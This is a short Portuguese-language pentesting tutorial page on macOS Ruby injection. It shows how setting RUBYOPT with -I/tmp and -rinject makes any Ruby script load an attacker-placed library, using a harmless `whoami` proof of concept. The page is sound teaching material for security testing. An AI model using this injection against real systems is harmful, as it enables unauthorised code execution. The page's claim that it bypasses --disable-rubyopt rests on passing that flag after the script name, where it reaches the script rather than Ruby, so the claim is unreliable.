# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Usando esta variável de ambiente, é possível **adicionar novos parâmetros** ao **ruby** sempre que ele for executado. Embora o parâmetro **`-e`** não possa ser usado para especificar o código ruby a ser executado, é possível usar os parâmetros **`-I`** e **`-r`** para adicionar uma nova pasta ao caminho das bibliotecas a serem carregadas e então **especificar uma biblioteca para carregar**.

Crie a biblioteca **`inject.rb`** em **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Crie em qualquer lugar um script Ruby como:
```ruby:hello.rb
puts 'Hello, World!'
```
Então, faça um script ruby arbitrário carregá-lo com:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Fato curioso, funciona mesmo com o parâmetro **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
